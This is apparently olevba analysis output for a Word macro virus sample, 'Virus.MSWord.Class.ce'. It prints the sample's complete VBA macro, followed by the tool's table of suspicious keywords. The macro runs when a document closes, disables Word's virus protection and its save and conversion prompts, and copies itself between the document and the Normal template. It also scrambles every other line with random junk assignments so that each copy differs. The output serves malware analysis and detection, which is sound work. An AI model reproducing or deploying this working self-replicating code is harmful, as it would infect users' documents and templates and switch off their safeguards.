olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Class.ce
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Class.ce - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
PLM = GGR + AQR
On Error Resume Next
PAJ = SRI + VTB
Application.EnableCancelKey = 0
UIL = QBN + KGN
Options.VirusProtection = 0
OFG = SSM + VUE
Options.SaveNormalPrompt = 0
PVF = LCV + OAM
Options.ConfirmConversions = 0
CCR = GBG + IGU
EA52 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
VIG = DDO + JJP
CR19 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
HNE = EMB + KTF
If EA52 > 0 And CR19 > 0 Then GoTo AC41
RIG = UNN + JCM
If EA52 = 0 Then
PUS = ALU + JOL
Set LU87 = ActiveDocument.VBProject.VBComponents.Item(1)
LKH = IFB + FVB
QO97 = True
IIK = DKF + NLD
End If
UOL = ICR + KQN
If CR19 = 0 Then
SAE = BCH + CAL
Set LU87 = NormalTemplate.VBProject.VBComponents.Item(1)
OLS = BEO + JHD
PM27 = True
PUL = BQI + KKE
End If
HCM = DUC + JGT
If PM27 <> True And QO97 <> True Then GoTo AC41
QGO = FBA + HRG
If PM27 = True Then LU87.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, EA52 - 1))
FKF = HAK + ETM
If QO97 = True Then LU87.CodeModule.AddFromString ("Sub Document_Close()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, CR19 - 1))
QUH = LBN + JVC
With LU87.CodeModule
UNH = DKE + VCA
For x = 2 To (LU87.CodeModule.CountOfLines - 1) Step 2
HMU = LIS + SOP
.replaceline x, (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & " = " & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & " + " & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22)))
VHK = JPD + JLR
Next x
LJL = FNK + OTI
End With
GGD = LEM + HTK
AC41:
EPQ = NRD + REV
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

